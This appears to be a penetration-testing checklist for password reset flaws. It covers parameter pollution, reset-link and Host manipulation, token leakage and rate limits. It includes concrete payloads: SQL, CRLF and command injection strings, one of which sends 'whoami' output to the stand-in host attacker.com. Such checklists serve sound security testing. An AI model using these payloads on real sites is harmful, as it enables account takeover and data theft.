# Broken Authentication
- [Reset Password functionality](#reset-password-functionality)


## Reset Password functionality
1. Password Reset Poisoning
    - Investigate whether the password reset functionality is vulnerable to poisoning by manipulating parameters in the request.
2. HTTP Parameter Pollution
    - Test for parameter pollution by using multiple formats:
```
email=victim@gmail.com&email=attacker@gmail.com
email[]=victim@gmail.com&email[]=attacker@gmail.com
email=victim@gmail.com%20email=attacker@gmail.com
email=victim@gmail.com|email=attacker@gmail.com
{"email":"victim@gmail.com","email":"attacker@gmail.com"}
{"email":["victim@gmail.com","attacker@gmail.com"]}
```
- Verify if it’s possible to reset the victim's password using a reset link sent to the attacker's inbox.
3. IDOR (Insecure Direct Object Reference)
    - Examine the reset link for parameters vulnerable to IDOR.
    - Use tools like ParamMiner to discover hidden or additional parameters. For example, appending parameters like uid from a profile update request.
4. Cryptographic Weakness
    - Check for predictable password reset tokens:
        - Analyze if the token generation logic can be guessed or reversed.
5. Token Leakage
    - Via Referrer Header: Open the reset link and click external links to see if the token is leaked.
    - In Responses or JS Files: Search for the reset token in API responses or JavaScript files.
6. Session Management
    - Verify if the session/token persists after resetting the password.
7. Password Policy Testing
    - Try weak or edge-case passwords:
        - Use only spaces as the password.
    - Check for acceptance of excessively long passwords to test for application-level DoS.
8. Multiple Token Handling
    - Request two reset links and verify if older tokens remain valid.
9. Password Reset Link Manipulation
- Test various link formats:
```
POST https://attacker.com/resetpassword.php HTTP/1.1
POST @attacker.com/resetpassword.php HTTP/1.1
POST :@attacker.com/resetpassword.php HTTP/1.1
POST /resetpassword.php@attacker.com HTTP/1.1
```
10. Injection Attacks
    - SQLi: `test@test.com'+(select*from(select(sleep(2)))a)+'`
    - CRLF Injection: `/resetpassword?%0d%0aHost:%20attacker.com`
    - Command Injection: `email=hello@'$(whoami)'.attacker.com`
11. User Enumeration
    - Check if errors or responses reveal whether an account exists.
12. Edge Cases
    - Register an account with the victim's username and include trailing or leading whitespace (e.g.,'tuhin1729' ,' tuhin1729'). Use the token to reset the victim's password (e.g., CVE-2020-7245).
13. 2FA/OTP Bypass
    - If OTPs are sent, employ known 2FA bypass techniques to verify security.
14. Homograph Testing
    - Use homographs (e.g., "victim@gmail.com" with visually similar Unicode characters) during registration and attempt password reset.
15. Request Modifications
    - Change the HTTP request method and Content-Type. Observe how the application handles unexpected formats.
16. Parameter Reflection
    - Check if parameter values (e.g., email) reflect in the response. Test for HTML Injection (HTMLi).
17. XML External Entity (XXE)
    - If the reset request accepts XML input, test for XXE vulnerabilities.
18. Rate Limiting
    - Test for missing rate limits by repeatedly triggering email notifications.
19. Advanced Attacks
    - Check whether any param value is reflecting in the email. Now try XSS - SSTI
20. Post-Reset Vulnerabilities
    - Confirm if 2FA is auto-disabled after a password reset.